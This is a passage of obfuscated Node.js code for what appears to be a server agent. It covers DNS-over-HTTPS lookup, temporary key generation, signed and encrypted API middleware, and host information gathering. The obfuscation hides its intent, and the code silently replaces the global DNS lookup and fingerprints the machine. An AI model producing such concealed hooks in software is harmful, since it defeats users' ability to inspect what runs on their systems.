                    'headers': {
                        'accept': d[eB(0xd28)],
                        'user-agent': eB(0x3c8)[eB(0x7b6)](a0ax[eB(0x9c3)])
                    }
                }, j => {
                    const eC = eB;
                    if (d[eC(0x5f5)](j[eC(0x12e)], 0xc8)) {
                        j[eC(0xd53)](), d['hdttT'](g, new Error('doh\x20http\x20status\x20'[eC(0x7b6)](j[eC(0x12e)])));
                        return;
                    }
                    const k = [];
                    j['on'](d[eC(0x72e)], l => k['push'](l)), j['on'](d[eC(0xc46)], () => {
                        const eD = eC;
                        try {
                            f(JSON[eD(0x766)](Buffer['concat'](k)[eD(0xa27)](eD(0x132))));
                        } catch (l) {
                            h[eD(0x80d)](g, l);
                        }
                    });
                });
            i['on'](d['iwFJl'], () => i[eB(0x4d7)](new Error(eB(0x5e0)))), i['on'](d['sBaxr'], g), i[eB(0x65c)]();
        });
    }
    [a0d0(0xee2)](a) {
        const eE = a0d0, b = {
                'frxDa': function (d, f) {
                    return d >= f;
                },
                'fzIET': function (d, f) {
                    return d - f;
                }
            }, c = Date['now']();
        b[eE(0xce7)](b[eE(0x9a2)](c, this[eE(0xc1b)]), a0aA[eE(0xca2)] * 0x3e8) && (this[eE(0xc1b)] = c, a0R['warn'](eE(0xda8)['concat'](a, eE(0xd9a))));
    }
    [a0d0(0xaae)](a, b) {
        const eF = a0d0, c = [...new Set(a)], d = [...new Set(b)];
        if (!c[eF(0x615)])
            return d;
        if (!d[eF(0x615)])
            return c;
        return this[eF(0xd3b)]() ? c[eF(0x7b6)](d) : d[eF(0x7b6)](c);
    }
    [a0d0(0xd3b)]() {
        const eG = a0d0, a = {
                'grgJN': function (b, c) {
                    return b === c;
                },
                'TTWsw': eG(0xd4e)
            };
        if (a[eG(0xcc5)](a0aA[eG(0x7c3)], undefined))
            try {
                const b = a0az[eG(0x666)](a[eG(0x3fa)]);
                b[eG(0xd81)](), a0aA[eG(0x7c3)] = !![];
            } catch (c) {
                a0aA[eG(0x7c3)] = ![];
            }
        return a0aA['_ipv6Usable'];
    }
    static ['validLiteral'](a, b) {
        const eH = a0d0, c = {
                'IWRkx': function (d, f) {
                    return d === f;
                }
            };
        return a0i[eH(0x945)](a) === (c[eH(0x1b8)](b, 0x1) ? 0x4 : 0x6);
    }
    static [a0d0(0x28b)](a) {
        const eI = a0d0;
        if (/^[\x00-\x7F]*$/[eI(0xdbb)](a))
            return a;
        try {
            return new URL('http://'[eI(0x7b6)](a))['hostname'];
        } catch (b) {
            return a;
        }
    }
}
const a0aB = a0ay[a0d0(0xcd9)];
function a0aC(a, b) {
    const eJ = a0d0, c = {
            'nvjVb': function (f, g) {
                return f(g);
            },
            'OYWex': function (f, g, h, i) {
                return f(g, h, i);
            },
            'fPQBY': function (f, g) {
                return f === g;
            },
            'NlyiI': eJ(0x6c3),
            'kLFUo': function (f, g) {
                return f !== g;
            },
            'GgtVK': 'string',
            'LxKmC': function (f, g) {
                return f === g;
            },
            'drlSp': eJ(0xbfb),
            'ehjRA': function (f, g) {
                return f || g;
            },
            'SQQxg': function (f, g) {
                return f === g;
            },
            'ZeOpL': eJ(0x324),
            'MejDd': function (f, g) {
                return f === g;
            },
            'rrDCJ': eJ(0xe94),
            'TsgQL': function (f, g) {
                return f !== g;
            }
        }, d = b || a0aB;
    return function f(g, h, i) {
        const eK = eJ, j = {
                'kWroB': function (n, o) {
                    return n === o;
                },
                'aAuAW': eK(0x7b8),
                'iuPen': function (n, o) {
                    const eL = eK;
                    return c[eL(0x443)](n, o);
                },
                'akyMs': function (n, o, p) {
                    return n(o, p);
                },
                'GlPCK': function (n, o, p, q) {
                    const eM = eK;
                    return c[eM(0x61c)](n, o, p, q);
                }
            };
        c[eK(0x250)](typeof h, c['NlyiI']) && (i = h, h = {});
        if (c['kLFUo'](typeof g, c[eK(0xccd)]) || !g || a0i[eK(0x945)](g))
            return d['call'](a0ay, g, h, i);
        const k = h || {};
        let l = c[eK(0x48e)](typeof k, c[eK(0xd05)]) ? k[eK(0xdee)] || 0x0 : c[eK(0xce)](k, 0x0);
        if (c[eK(0x250)](l, eK(0x52c)) || c['SQQxg'](l, c[eK(0x30e)]))
            l = 0x4;
        else {
            if (c[eK(0x5ae)](l, eK(0xdb)) || c[eK(0x250)](l, c[eK(0xe7a)]))
                l = 0x6;
            else {
                if (c[eK(0xc65)](typeof l, 'number'))
                    l = 0x0;
            }
        }
        const m = c[eK(0x5ae)](typeof k, c['drlSp']) && !!k[eK(0xb59)];
        a[eK(0x983)](g, l)[eK(0x9f0)](n => {
            const eN = eK;
            if (j[eN(0xd7b)](n, null))
                return a[eN(0xee2)](g), d[eN(0x14e)](a0ay, g, h, i);
            if (!n[eN(0x615)]) {
                const o = new Error(eN(0xbf0)['concat'](g, eN(0x304)));
                return o['code'] = j[eN(0x79c)], o[eN(0xab9)] = eN(0xaab), o[eN(0x1de)] = g, j[eN(0xd6e)](i, o);
            }
            m ? j['akyMs'](i, null, n[eN(0x9c5)](p => ({
                'address': p,
                'family': a0i['isIP'](p)
            }))) : j['GlPCK'](i, null, n[0x0], a0i[eN(0x945)](n[0x0]));
        })[eK(0xef4)](n => i(n || new Error(eK(0xcc0))));
    };
}
function a0aD(a = null) {
    const eO = a0d0, b = {
            'GMGSv': function (f, g) {
                return f(g);
            },
            'RwVGq': function (f, g) {
                return f === g;
            },
            'Ghgpy': function (f, g) {
                return f !== g;
            }
        };
    if (a0aA[eO(0x815)])
        return a0aA[eO(0x815)];
    const c = b['GMGSv'](String, b[eO(0x5ec)](a, null) ? a0ax[eO(0x8b7)] : a)[eO(0x27f)]()['toLowerCase']();
    if (b['Ghgpy'](c, 'on'))
        return null;
    let d = null;
    return a0ax['DOH_SERVERS'] && (d = a0ax['DOH_SERVERS'][eO(0xc0)](/[,\s]+/)[eO(0x9c5)](f => f[eO(0x27f)]())[eO(0x74d)](Boolean)), a0aA[eO(0x815)] = new a0aA({ 'servers': d }), a0ay['lookup'] = a0aC(a0aA[eO(0x815)], a0aB), a0R[eO(0x6e3)](eO(0x954)[eO(0x7b6)](a0aA['_globalHook']['servers'][eO(0x782)](',\x20'))), a0aA['_globalHook'];
}
a0aD();
class a0aE {
    constructor() {
        const eP = a0d0;
        this['_key'] = null, this[eP(0x7f5)] = null;
    }
    [a0d0(0x15d)](a) {
        const eQ = a0d0, b = {
                'LOaHW': function (c, d) {
                    return c === d;
                },
                'mFeYC': eQ(0x6c3)
            };
        this[eQ(0x564)]();
        if (this[eQ(0x130)]) {
            if (b[eQ(0x94d)](this[eQ(0x130)]['ttl_seconds'], a * 0xe10))
                return this[eQ(0x130)];
            const c = this['_key'][eQ(0xb6b)];
            this['_key'] = null, a0R[eQ(0x9cd)](eQ(0x4cf)[eQ(0x7b6)](c));
            if (typeof this[eQ(0x7f5)] === b['mFeYC'])
                try {
                    this[eQ(0x7f5)]();
                } catch (d) {
                    a0R[eQ(0x755)](eQ(0x5d1)[eQ(0x7b6)](d[eQ(0xf18)]));
                }
        }
        return this['_key'] = this[eQ(0x2a9)](a), a0R[eQ(0x6e3)]('🔑\x20[TempKey]\x20新临时密钥已生成:\x20key_id='[eQ(0x7b6)](this[eQ(0x130)]['key_id'], eQ(0x3ce))[eQ(0x7b6)](a, '\x20小时')), this[eQ(0x130)];
    }
    [a0d0(0x2b4)]() {
        const eR = a0d0;
        this[eR(0x564)]();
        if (this[eR(0x130)])
            return this[eR(0x130)][eR(0x999)];
        return null;
    }
    ['getActiveEciesPub']() {
        const eS = a0d0;
        this[eS(0x564)]();
        if (this[eS(0x130)])
            return this[eS(0x130)]['ecies_pub'];
        return null;
    }
    [a0d0(0x564)]() {
        const eT = a0d0, a = { 'cxTiG': eT(0x6c3) };
        if (this[eT(0x130)] && this[eT(0x589)](this[eT(0x130)])) {
            const b = this['_key']['key_id'];
            this[eT(0x130)] = null, a0R[eT(0x9cd)]('🔄\x20[TempKey]\x20临时密钥已过期:\x20key_id='[eT(0x7b6)](b));
            if (typeof this[eT(0x7f5)] === a[eT(0x96b)])
                try {
                    this[eT(0x7f5)]();
                } catch (c) {
                    a0R[eT(0x755)](eT(0xc2c)['concat'](c[eT(0xf18)]));
                }
        }
    }
    [a0d0(0x589)](a) {
        const eU = a0d0;
        return Math['floor'](Date[eU(0x430)]() / 0x3e8) >= a['expires_at'];
    }
    [a0d0(0x2a9)](a) {
        const eV = a0d0, b = {
                'xceOX': eV(0xe4a),
                'arKJO': eV(0x6f2),
                'clnnT': 'jwk',
                'wvIac': eV(0xbb7),
                'giFhG': function (o, p) {
                    return o - p;
                },
                'bdAwJ': function (o, p) {
                    return o * p;
                },
                'vePsr': 'hex',
                'VMvby': 'base64url',
                'LaaLn': eV(0xc75)
            }, {
                privateKey: c,
                publicKey: d
            } = a0k[eV(0xd77)]('ec', { 'namedCurve': eV(0xd90) }), f = c['export']({
                'type': b['xceOX'],
                'format': b[eV(0x769)]
            }), g = d['export']({
                'type': eV(0xbb7),
                'format': b[eV(0x769)]
            }), h = a0k[eV(0x91e)](0x20), i = Buffer[eV(0x58d)](a0B[eV(0x572)](h, ![])), j = c['export']({ 'format': b['clnnT'] }), k = d['export']({
                'type': b[eV(0x4a6)],
                'format': eV(0x979)
            }), l = k[eV(0x3d1)](b[eV(0xd20)](k[eV(0x615)], 0x41)), m = Math[eV(0x69d)](Date[eV(0x430)]() / 0x3e8), n = b['bdAwJ'](a, 0xe10);
        return {
            'key_id': a0k[eV(0x91e)](0x8)[eV(0xa27)](b[eV(0x1ef)]),
            'created_at': m,
            'expires_at': m + n,
            'ttl_seconds': n,
            'ecdsa_private_key': f,
            'ecdsa_public_key': g,
            'ecies_private_key': h[eV(0xa27)](b[eV(0x1ef)]),
            'ecies_public_key': i[eV(0xa27)](b['vePsr']),
            'ecdsa_private_hex': Buffer[eV(0x58d)](j['d'], b['VMvby'])[eV(0xa27)](b['vePsr']),
            'ecdsa_public_b64': Buffer['from'](a0A[eV(0x72b)]['fromBytes'](l)[eV(0xd3e)](!![]))[eV(0xa27)](eV(0xc75)),
            'ecies_public_b64': Buffer[eV(0x58d)](a0B[eV(0x572)](h, !![]))[eV(0xa27)](b[eV(0xc7e)]),
            'ecdsa_vk': d,
            'ecies_pub': i
        };
    }
}
class a0aF {
    constructor(a, b) {
        const eW = a0d0, c = {
                'vFNJL': eW(0x5b5),
                'HPBaS': 'base64',
                'ewgmT': function (d, f) {
                    return d(f);
                },
                'OBcOR': 'P-256'
            };
        this['ecdsaPubkey'] = null, this['eciesPubkey'] = null;
        if (a)
            try {
                const d = a['trim']();
                if (d[eW(0x46a)](c[eW(0x540)]))
                    this['ecdsaPubkey'] = a0k[eW(0xef9)](d);
                else {
                    const f = Buffer[eW(0x58d)](d, c[eW(0xc19)]), g = a0A[eW(0x72b)]['fromBytes'](f), h = g[eW(0xd3e)](![]), i = m => m[eW(0xa27)](eW(0xc75))[eW(0xde0)](/\+/g, '-')[eW(0xde0)](/\//g, '_')[eW(0xde0)](/=/g, ''), j = i(Buffer[eW(0x58d)](h['slice'](0x1, 0x21))), k = c[eW(0xe47)](i, Buffer[eW(0x58d)](h['slice'](0x21, 0x41))), l = {
                            'kty': 'EC',
                            'crv': c[eW(0xd29)],
                            'x': j,
                            'y': k
                        };
                    this[eW(0x7c6)] = a0k[eW(0xef9)]({
                        'key': l,
                        'format': eW(0x395)
                    });
                }
            } catch (m) {
                a0R[eW(0x755)](eW(0x5ea)['concat'](m[eW(0xf18)])), this[eW(0x7c6)] = null;
            }
        if (b)
            try {
                this[eW(0x9b2)] = a0w[eW(0x333)](b['trim']());
            } catch (n) {
                a0R['warn'](eW(0x38f)[eW(0x7b6)](n[eW(0xf18)]));
            }
    }
    [a0d0(0x2fc)](a, b, c, d, f, g, h = null) {
        const eX = a0d0, i = {
                'hTHrI': eX(0x6fa),
                'APkId': function (j, k) {
                    return j(k);
                },
                'EbUOy': function (j, k) {
                    return j > k;
                },
                'ubpaw': function (j, k) {
                    return j - k;
                },
                'njmKm': function (j, k) {
                    return j - k;
                },
                'ebRKD': function (j, k, l, m, n, o) {
                    return j(k, l, m, n, o);
                },
                'bhWcs': 'static',
                'NHwDV': eX(0x6fd),
                'wATDP': eX(0xed)
            };
        if (!this[eX(0x7c6)])
            throw new Error(i['hTHrI']);
        try {
            const j = i[eX(0x944)](parseInt, f), k = Math[eX(0x69d)](Date[eX(0x430)]() / 0x3e8);
            if (i[eX(0x1e8)](Math['abs'](i[eX(0xb65)](k, j)), a0ax[eX(0x7fe)]))
                throw new Error(eX(0xeb9)[eX(0x7b6)](Math['abs'](i['njmKm'](k, j)), eX(0x5fd))[eX(0x7b6)](a0ax[eX(0x7fe)], 's'));
            const l = i[eX(0x397)](a0aG, a, b, c, d, f);
            if (this['_verifyWith'](this['ecdsaPubkey'], l, g))
                return i['bhWcs'];
            if (h && this['_verifyWith'](h, l, g))
                return i[eX(0xea)];
            throw new Error(i['wATDP']);
        } catch (m) {
            throw new Error(eX(0xd5c)['concat'](m['message']));
        }
    }
    ['_verifyWith'](a, b, c) {
        const eY = a0d0, d = { 'OvxWC': 'SHA256' };
        if (!a)
            return ![];
        try {
            const f = a0w[eY(0x333)](c), g = a0k[eY(0x6c9)](d[eY(0xadd)]);
            return g[eY(0xaf5)](b), g[eY(0xb2f)](a, f);
        } catch (h) {
            return ![];
        }
    }
    [a0d0(0xe5e)](a, b = null) {
        const eZ = a0d0, c = {
                'uTbQY': 'ECIES\x20public\x20key\x20not\x20initialized,\x20cannot\x20encrypt\x20response',
                'pmbYP': function (d, f, g) {
                    return d(f, g);
                },
                'Wheiq': eZ(0xc75)
            };
        if (a0ax[eZ(0x892)])
            return JSON[eZ(0xbbe)](a);
        if (!this[eZ(0x9b2)])
            throw new Error(c[eZ(0x1a9)]);
        try {
            const d = JSON[eZ(0xbbe)](a), f = Buffer['from'](d, 'utf-8'), g = b || Buffer[eZ(0x58d)](this['eciesPubkey']), h = c[eZ(0x596)](a0v, g, f);
            return Buffer[eZ(0x58d)](h)[eZ(0xa27)](c['Wheiq']);
        } catch (i) {
            throw new Error(eZ(0x6ca)[eZ(0x7b6)](i[eZ(0xf18)]));
        }
    }
    [a0d0(0xb2)](a, b) {
        const f0 = a0d0, c = {
                'jsAaR': function (d, f) {
                    return d !== f;
                },
                'MHhCp': f0(0xc25),
                'NOLlZ': f0(0xc75),
                'fGxht': f0(0x132),
                'MJUXk': f0(0xd8e)
            };
        if (!b || c['jsAaR'](b[f0(0x615)], 0x20))
            throw new Error(c[f0(0x5ed)]);
        try {
            const d = Buffer[f0(0x58d)](a, c[f0(0x216)])[f0(0xa27)](c[f0(0x14f)]), f = JSON[f0(0x766)](d);
            if (!f['nonce'] || !f['tag'] || !f[f0(0xd5e)])
                throw new Error(c[f0(0x5b0)]);
            const g = Buffer[f0(0x58d)](f[f0(0xd8)], 'base64'), h = Buffer[f0(0x58d)](f['tag'], c[f0(0x216)]), i = Buffer[f0(0x58d)](f[f0(0xd5e)], c[f0(0x216)]), j = a0k[f0(0x75c)](f0(0xb0), b, g);
            j[f0(0xb21)](h);
            let k = j[f0(0xaf5)](i, null, c[f0(0x14f)]);
            return k += j[f0(0xd42)]('utf8'), k;
        } catch (l) {
            throw new Error('AES\x20Decrypt\x20Error:\x20'[f0(0x7b6)](l[f0(0xf18)]));
        }
    }
    [a0d0(0x21d)](a, b) {
        const f1 = a0d0, c = {
                'Ppynf': f1(0x7ad),
                'WrHpN': 'base64',
                'nRQIa': f1(0x132)
            };
        if (!b || b[f1(0x615)] !== 0x20)
            throw new Error(c[f1(0xef8)]);
        try {
            const d = a0k[f1(0x91e)](0xc), f = a0k[f1(0xa1c)](f1(0xb0), b, d), g = Buffer[f1(0x7b6)]([
                    f[f1(0xaf5)](a),
                    f['final']()
                ]), h = f[f1(0x71d)](), i = {
                    'nonce': d[f1(0xa27)](c['WrHpN']),
                    'tag': h[f1(0xa27)](c[f1(0x4b2)]),
                    'ciphertext': g[f1(0xa27)](c[f1(0x4b2)])
                };
            return Buffer[f1(0x58d)](JSON[f1(0xbbe)](i), c[f1(0xaf8)])['toString'](c[f1(0x4b2)]);
        } catch (j) {
            throw new Error(f1(0xaa0)[f1(0x7b6)](j[f1(0xf18)]));
        }
    }
}
function a0aG(a, b, c, d, f) {
    const f2 = a0d0, g = {
            'wNQwZ': f2(0x904),
            'dkdsn': f2(0xaef)
        };
    return !c && (c = a0k[f2(0xb88)](g[f2(0x5eb)])[f2(0xaf5)](Buffer[f2(0xacf)](0x0))[f2(0x40b)](g[f2(0x45f)])), ''[f2(0x7b6)](a, '\x0a')['concat'](b, '\x0a')[f2(0x7b6)](c, '\x0a')[f2(0x7b6)](d, '\x0a')[f2(0x7b6)](f);
}
function a0aH(a, b = null) {
    const f3 = a0d0, c = {
            'CMXLM': f3(0x852),
            'sPLYz': f3(0xb48),
            'CyIsA': function (d, f) {
                return d === f;
            },
            'cZkaI': f3(0xa35),
            'ajzod': 'Content-Length',
            'bWvsC': f3(0xdc1),
            'SFlsW': f3(0xd7a),
            'YEglu': f3(0xc75),
            'NUfDQ': f3(0x1e5),
            'lqTdJ': f3(0xcfb),
            'BfmwG': function (d) {
                return d();
            },
            'JbglJ': function (d) {
                return d();
            },
            'OiWdJ': f3(0xa83),
            'dguNY': 'HEAD',
            'kIvxQ': function (d) {
                return d();
            },
            'VuNNC': f3(0x469),
            'FMPal': f3(0x819),
            'FopDN': f3(0xb98),
            'ptCPL': f3(0x859),
            'kumDv': f3(0x363),
            'EXhOJ': 'X-Timestamp',
            'CwXJZ': f3(0xb78),
            'yqhqj': 'X-Auth-Token',
            'JTHsA': function (d) {
                return d();
            },
            'yjVZn': f3(0xbf1),
            'MfDrC': f3(0x600),
            'odXDC': f3(0xefa),
            'NjTKr': f3(0x920),
            'njrWD': function (d, f) {
                return d > f;
            },
            'bTvaC': f3(0x904),
            'UnwoN': f3(0xaef),
            'evRgp': f3(0x6fd),
            'hgiUf': f3(0x686),
            'hQdkr': function (d) {
                return d();
            },
            'FKboq': f3(0x365),
            'yOEKd': f3(0xd97),
            'OkYsC': f3(0xe18)
        };
    return async (d, f, g) => {
        const f4 = f3, h = {
                'rNUfL': c[f4(0x8df)],
                'JtXUT': function (o, p) {
                    const f5 = f4;
                    return c[f5(0x724)](o, p);
                },
                'DFSLD': f4(0xb48),
                'Xmlcw': c['cZkaI'],
                'wSIco': c[f4(0x611)],
                'RWtpq': c[f4(0x69e)],
                'yrvNu': c['SFlsW'],
                'QxVXl': function (o, p) {
                    const f6 = f4;
                    return c[f6(0x724)](o, p);
                },
                'ZKRft': f4(0xefa),
                'AItqz': 'utf8',
                'rVEFf': c[f4(0xe48)],
                'CAvHC': f4(0xd97),
                'hteGJ': c['NUfDQ']
            };
        if (d[f4(0xda2)][f4(0x46a)](c['lqTdJ']))
            return c[f4(0xa8c)](g);
        if (d['path'][f4(0x46a)](c['CMXLM']) && !d[f4(0xda2)][f4(0x46a)](f4(0x600)) || d[f4(0xda2)]['startsWith'](f4(0xf0)))
            return c[f4(0xc96)](g);
        const i = f[f4(0xb36)];
        f[f4(0xb36)] = function (o) {
            const f7 = f4;
            if (d[f7(0xda2)][f7(0x46a)](h[f7(0x68a)]))
                return i[f7(0x14e)](this, o);
            if (a0ax[f7(0x892)]) {
                const p = h['JtXUT'](typeof o, f7(0xefa)) ? o : Buffer['isBuffer'](o) ? o : JSON['stringify'](o);
                return f['set'](h[f7(0xa41)], h[f7(0x40c)]), f['set'](h['wSIco'], Buffer[f7(0xae4)](p)[f7(0xa27)]()), i[f7(0x14e)](this, p);
            }
            if (f[f7(0xb2b)](h[f7(0x63a)]) && f[f7(0xb2b)](f7(0xdc1))['includes'](h[f7(0xc95)]))
                try {
                    if (d[f7(0x462)]) {
                        let q;
                        if (d[f7(0xda2)] === f7(0x469)) {
                            const r = h[f7(0x354)](typeof o, h[f7(0x23b)]) ? JSON[f7(0x766)](o) : o;
                            let s = null;
                            h[f7(0x354)](d[f7(0x7b2)], f7(0x6fd)) && b && (s = b[f7(0x257)]());
                            const t = a[f7(0xe5e)](r, s);
                            q = typeof t === f7(0xefa) ? t : JSON[f7(0xbbe)](t);
                        } else {
                            const u = Buffer[f7(0x55b)](o) ? o : typeof o === h[f7(0x23b)] ? Buffer[f7(0x58d)](o, h[f7(0x4cb)]) : Buffer[f7(0x58d)](JSON[f7(0xbbe)](o), h[f7(0x4cb)]);
                            q = a[f7(0x21d)](u, Buffer['from'](a0ax[f7(0xdd3)], h['rVEFf']));
                        }
                        return f[f7(0x6e7)](h[f7(0xa41)], h['CAvHC']), f[f7(0x6e7)](h[f7(0xb7d)], a0ax[f7(0x9c3)]), f[f7(0x6e7)](h[f7(0x94e)], Buffer[f7(0xae4)](q, h[f7(0x4cb)])[f7(0xa27)]()), i['call'](this, q);
                    } else {
                        const v = typeof o === f7(0xefa) ? o : JSON[f7(0xbbe)](o);
                        return f['set']('Content-Length', Buffer['byteLength'](v, f7(0x132))[f7(0xa27)]()), i['call'](this, v);
                    }
                } catch (w) {
                    if (!f[f7(0x9ea)]) {
                        const x = JSON['stringify']({ 'error': f7(0x1c1)['concat'](w[f7(0xf18)]) });
                        return f[f7(0xab3)](0x1f4), f[f7(0x6e7)](h[f7(0x63a)], h['yrvNu']), f[f7(0x6e7)](h[f7(0x94e)], Buffer[f7(0xae4)](x, h[f7(0x4cb)])[f7(0xa27)]()), i[f7(0x14e)](this, x);
                    }
                    throw w;
                }
            return i[f7(0x14e)](this, o);
        };
        const j = f['end'];
        f['end'] = function (...o) {
            const f8 = f4;
            return a0ax[f8(0x892)] && !d['path'][f8(0x46a)](c['CMXLM']) && !f[f8(0xb2b)](c['sPLYz']) && f[f8(0x6e7)](c['sPLYz'], f8(0xa35)), j['apply'](this, o);
        };
        if (c[f4(0x724)](d['method'], c['OiWdJ']) || d['method'] === c[f4(0x4da)])
            return a0ax['DEBUG'] && f[f4(0x6e7)](c[f4(0xe7b)], c[f4(0xb33)]), c[f4(0xc4a)](g);
        d[f4(0x462)] = ![];
        const k = [
            c[f4(0xbf5)],
            c[f4(0x1d5)]
        ];
        if (a0ax['DEBUG'])
            return d[f4(0x462)] = !![], g();
        const l = d[f4(0xe76)][c['FopDN']] || d[f4(0xe76)][c[f4(0x630)]], m = d[f4(0xe76)][c['kumDv']] || d['headers'][c[f4(0xa91)]], n = d[f4(0xe76)][c[f4(0xcec)]] || d['headers'][c[f4(0x667)]];
        if (!l || !m || !n)
            return k[f4(0xd32)](d[f4(0xda2)]) ? c[f4(0x350)](g) : f[f4(0xab3)](0x191)[f4(0x3f9)]({ 'error': c['yjVZn'] });
        try {
            let o = Buffer[f4(0xacf)](0x0);
            if (d[f4(0xda2)] !== f4(0xc04) && !(d[f4(0xda2)]['startsWith']('/api/proxy/') && d[f4(0xda2)] !== c[f4(0x9c9)])) {
                if (Buffer[f4(0x55b)](d[f4(0x72a)]))
                    o = d[f4(0x72a)];
                else {
                    if (c[f4(0x724)](typeof d['body'], c['odXDC']))
                        o = Buffer[f4(0x58d)](d[f4(0x72a)], c[f4(0xf1e)]);
                }
            }
            const p = c[f4(0x101)](o[f4(0x615)], 0x0) ? a0k[f4(0xb88)](c[f4(0xca6)])[f4(0xaf5)](o)['digest'](c['UnwoN']) : '', q = b ? b[f4(0x2b4)]() : null, r = a['verifySignature'](d[f4(0xae)], d['path'], p, l, m, n, q);
            d[f4(0x462)] = !![], d['key_source'] = c[f4(0x724)](r, f4(0x6fd)) ? c['evRgp'] : c['hgiUf'];
        } catch (s) {
            return k['includes'](d[f4(0xda2)]) ? c[f4(0x655)](g) : f['status'](0x191)['json']({ 'error': f4(0xd5c)[f4(0x7b6)](s[f4(0xf18)]) });
        }
        if (d[f4(0x72a)] && c[f4(0x724)](typeof d[f4(0x72a)], c[f4(0x4bb)])) {
            const t = c[f4(0x724)]((d[f4(0xe76)][c[f4(0x2b0)]] || '')['toLowerCase'](), c[f4(0xbdf)]);
            try {
                if (t && d[f4(0x462)]) {
                    const u = Buffer[f4(0x58d)](a0ax[f4(0xdd3)], c[f4(0xe48)]), v = a[f4(0xb2)](d['body'], u);
                    d[f4(0x72a)] = JSON[f4(0x766)](v);
                } else {
                    if (d[f4(0x72a)][f4(0x46a)](c[f4(0x980)])) {
                        const w = Buffer[f4(0x58d)](d[f4(0x72a)], c[f4(0xe48)])[f4(0xa27)](c['NjTKr']);
                        d[f4(0x72a)] = JSON[f4(0x766)](w);
                    } else {
                        if (d[f4(0x72a)][f4(0x27f)]()[f4(0x46a)]('{') || d[f4(0x72a)][f4(0x27f)]()[f4(0x46a)]('['))
                            d[f4(0x72a)] = JSON[f4(0x766)](d[f4(0x72a)]);
                        else {
                            if (d['body'][f4(0x27f)]() === '')
                                d['body'] = {};
                        }
                    }
                }
            } catch (x) {
                return a0R[f4(0x755)](f4(0x8c6)['concat'](x[f4(0xf18)])), f[f4(0xab3)](0x190)[f4(0x3f9)]({ 'error': 'Invalid\x20body\x20format:\x20'[f4(0x7b6)](x[f4(0xf18)]) });
            }
        }
        c[f4(0x350)](g);
    };
}
class a0aI {
    constructor() {
        const f9 = a0d0, a = {
                'LJWvb': function (b, c) {
                    return b / c;
                }
            };
        this[f9(0xd95)] = {
            'rx': 0x0,
            'tx': 0x0
        }, this[f9(0x6c2)] = 0x0, this[f9(0x38b)] = 0x0, this[f9(0xada)] = a[f9(0x280)](Date[f9(0x430)](), 0x3e8);
    }
    async ['getContainerMemory']() {
        const fa = a0d0, a = {
                'PGyKo': fa(0x392),
                'SIHbL': 'utf8',
                'xKMTS': fa(0x8b4),
                'mhzLK': function (d, f, g) {
                    return d(f, g);
                },
                'DUZCm': fa(0x1a4),
                'NpMSj': function (d, f, g) {
                    return d(f, g);
                },
                'DWMSN': function (d, f) {
                    return d > f;
                },
                'wCkup': function (d, f) {
                    return d === f;
                },
                'LXYYw': function (d, f) {
                    return d === f;
                },
                'PFHWp': function (d, f) {
                    return d(f);
                },
                'iFRcx': function (d, f) {
                    return d - f;
                }
            };
        let b = null, c = null;
        try {
            const d = (await a0m[fa(0xd58)](a[fa(0xa80)], a['SIHbL']))[fa(0x27f)]();
            b = d === a[fa(0x976)] ? null : parseInt(d, 0xa), c = a[fa(0x562)](parseInt, (await a0m[fa(0xd58)](fa(0xaa), a[fa(0x401)]))[fa(0x27f)](), 0xa);
        } catch {
            try {
                b = a[fa(0x562)](parseInt, (await a0m[fa(0xd58)](a[fa(0xc31)], a[fa(0x401)]))[fa(0x27f)](), 0xa), c = a[fa(0x9bb)](parseInt, (await a0m['readFile'](fa(0x157), a[fa(0x401)]))['trim'](), 0xa);
                if (a[fa(0x9b3)](b, 0x7ffffffffffff000))
                    b = null;
            } catch {
                const f = await a0u[fa(0xbb0)]();
                b = f[fa(0x383)], c = f[fa(0x554)];
            }
        }
        if (a[fa(0x831)](b, null)) {
            const g = await a0u[fa(0xbb0)]();
            b = g[fa(0x383)], (a[fa(0x830)](c, null) || a[fa(0x4ce)](isNaN, c)) && (c = g[fa(0x554)]);
        }
        return {
            'total': b,
            'used': c,
            'available': a[fa(0x416)](b, c),
            'free': a[fa(0x416)](b, c),
            'cached': 0x0,
            'buffers': 0x0
        };
    }
    async ['getBasicInfo']() {
        const fb = a0d0, a = await this[fb(0x3a3)](), b = await this['collectLocalInfo'](a['virtualization']), c = await this[fb(0xc98)](), d = a0aI['assembleBaseInfo'](a, b, c);
        return a0R[fb(0xb89)](fb(0xcad)[fb(0x7b6)](JSON['stringify'](d, null, 0x2)), 0x1), d;
    }
    static [a0d0(0xd03)](a, b, c) {
        const fc = a0d0;
        return {
            'arch': a[fc(0xd3f)],
            'cpu_cores': a[fc(0x982)],
            'cpu_name': a['cpu_name'],
            'disk_total': b['disk_total'],
            'gpu_name': a[fc(0xbb1)],
            'ipv4': c['ipv4'] ?? null,
            'ipv6': c['ipv6'] ?? null,
            'mem_total': b[fc(0x599)],
            'os': a['os'],
            'kernel_version': a['kernel_version'],
            'swap_total': b[fc(0xe81)],
            'version': a[fc(0x794)],
            'virtualization': a[fc(0x271)],
            'marks': Array[fc(0x5f9)](a[fc(0xbc1)]) ? [...a[fc(0xbc1)]] : []
        };
    }
    static [a0d0(0x80b)]() {
        const fd = a0d0;
        return {
            'arch': '',
            'cpu_cores': 0x0,
            'cpu_name': '',
            'gpu_name': '',
            'os': '',
            'kernel_version': '',
            'version': a0ax[fd(0x9c3)],
            'virtualization': '',
            'marks': []
        };
    }
    static [a0d0(0x3ba)]() {
        return {
            'disk_total': 0x0,
            'mem_total': 0x0,
            'swap_total': 0x0
        };
    }
    static [a0d0(0xcda)]() {
        return {
            'ipv4': null,
            'ipv6': null
        };
    }
    async [a0d0(0x3a3)]() {
        const fe = a0d0;
        let a = {}, b = {};
        try {
            a = await a0u[fe(0xb6f)]();
        } catch (d) {
            a0R['debug'](fe(0x134)['concat'](d[fe(0xf18)]), 0x1);
        }
        try {
            b = await a0u['osInfo']();
        } catch (f) {
            a0R['debug']('获取\x20OS\x20信息失败:\x20'[fe(0x7b6)](f[fe(0xf18)]), 0x1);
        }
        let c = '';
        try {
            c = await this[fe(0x301)]();
        } catch (g) {
            a0R['debug'](fe(0xc53)[fe(0x7b6)](g[fe(0xf18)]), 0x1);
        }
        return {
            'arch': a0p[fe(0xd3f)]() || '',
            'cpu_cores': a[fe(0x28f)] || 0x0,
            'cpu_name': a['brand'] || '',
            'gpu_name': '',
            'os': ''[fe(0x7b6)](b[fe(0xc45)] || '', '\x20')[fe(0x7b6)](b[fe(0x287)] || '')['trim'](),
            'kernel_version': b[fe(0x327)] || '',
            'version': a0ax[fe(0x9c3)],
            'virtualization': c,
            'marks': this[fe(0x705)]()
        };
    }
    async [a0d0(0xcc)](a) {
        const ff = a0d0;
        let b = 0x0;
